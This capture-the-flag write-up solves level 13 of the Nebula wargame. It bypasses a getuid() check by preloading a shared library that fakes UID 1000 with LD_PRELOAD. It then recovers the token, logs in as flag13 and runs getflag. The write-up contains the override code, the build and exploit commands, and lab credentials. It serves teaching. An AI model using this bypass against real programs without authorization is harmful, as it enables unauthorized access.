# Level 13

There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.

To do this level, log in as the **level13** account with the password **level13**. Files for this level can be found in /home/flag13

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <string.h>

#define FAKEUID 1000

int main(int argc, char **argv, char **envp)
{
  int c;
  char token[256];

  if(getuid() != FAKEUID) {
      printf("Security failure detected. UID %d started us, we expect %d\n", getuid(), FAKEUID);
      printf("The system administrators will be notified of this violation\n");
      exit(EXIT_FAILURE);
  }

  // snip, sorry :)

  printf("your token is %s\n", token);
  
}
```

## Writeup

In this code we need to set our **UID** to **1000** to get the token.

To do that we can use **LD_PRELOAD** to dinamically load a new version of the **getuid()** function that return always **1000**.

Let's create a new program called **getuid.c** (stored in **/home/level13**) that override the function **getuid()**:

```c
#include <unistd.h>
#include <sys/types.h>

uid_t getuid(void){
    return 1000;
}
```

Now compile it with **gcc** and **-shared** option to create a runtime linkable object and **-fPIC** to generate **Position Independent Code** that is reallocable:

```bash
gcc -shared -fPIC -o getuid.so getuid.c
```

**N.B.** in the manual page of **ld.so** there is this text:

```
For setuid/setgid ELF binaries, only libraries in the standard search directories that are also setgid will be loaded.
```

If the binary is **SETUID** also the library must be **SETUID**.

We can copy the binary to remove the **SETUID** bit, is not usefull for this challenge:

```bash
cp /home/flag13/flag13 /home/level13/
```

Now we can use the exploit:

```bash
LD_PRELOAD=/home/level13/getuid.so /home/level13/flag13
```

The output is this:

```
your token is b705702b-76a8-42b0-8844-3adabbe5ac58
```

We can now use the token to login as flag13:

```bash
ssh flag13@nebula
```

We are now **flag13**:

```bash
flag13@nebula:~$ id
uid=986(flag13) gid=986(flag13) groups=986(flag13)
```

We can now able to run the **getflag** command:

```bash
flag13@nebula:~$ getflag
You have successfully executed getflag on a target account
```